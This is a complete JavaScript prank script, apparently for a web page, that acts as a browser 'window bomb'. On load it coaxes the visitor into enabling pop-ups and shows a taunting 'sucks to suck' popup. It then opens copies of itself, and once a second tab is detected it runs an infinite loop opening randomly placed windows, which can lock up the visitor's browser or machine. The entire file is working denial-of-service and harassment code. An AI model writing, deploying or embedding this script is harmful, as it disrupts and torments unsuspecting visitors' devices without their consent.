localStorage.openpages = Date.now();

var anotherPageOpen = false;

var onLocalStorageEvent = function(e){
  if (e.key == "openpages") {
    localStorage.page_available = Date.now();
  }
  if (e.key == "page_available") {
    anotherPageOpen = true;
  }
};

window.addEventListener('storage', onLocalStorageEvent, false);

function openRandomWindows() {
  const newWin = window.open('', "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=200, height=180, titlebar=no, alwaysRaised=yes');
  if (newWin) {
    const screenWidth = screen.width - 200;
    const screenHeight = screen.height - 180;

    const randomX = Math.floor(Math.random() * screenWidth);
    const randomY = Math.floor(Math.random() * screenHeight);

    newWin.moveTo(randomX, randomY);

    return newWin;
  }
}

function openWindows() {
  for (let i = 0; i < 5; i++) {
    let newWin = window.open(window.location.href, '_blank', 'width=100,height=100,resizable=no,scrollbars=no');
    newWin.moveTo(screen.width, screen.height);
  }
}

function requestPopup() {
  const popup = window.open('about:blank', '_blank');
  if (popup) {
    popup.document.write(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <title>Sucks to suck</title>
      </head>
      <body>
        <h1 style="text-align: center; font-size: 3em; margin-top: 0.2em;">sucks to suck</h1>
        <img style="z-index: -100; width: 100%; height: 100%; min-height: 100%; position: fixed; top: 65%; left: 50%; transform: translate(-50%, -50%);" src="https://rip.up.railway.app/laugh.gif">
      </body>
      </html>
    `);
    openWindows();
    return true;
  } else {
    document.body.innerHTML = `
      <h1 style="text-align: center; font-size: 3em; margin-top: 0.2em;">enable pop-ups pls</h1>
      <img style="z-index: -100; width: 100%; height: 100%; min-height: 100%; position: fixed; top: 60%; left: 45%; transform: translate(-50%, -50%);" src="https://rip.up.railway.app/please.png">
    `;
    return false;
  }
}

function checkOpenPages() {
  setTimeout(function() {
    if (anotherPageOpen) {
      while (true) openRandomWindows();
    } else {
      let accepted = requestPopup();
      if (!accepted) {
        setTimeout(checkOpenPages, 100);
      }
    }
  }, 100);
}

window.onload = function() {
  checkOpenPages();
};
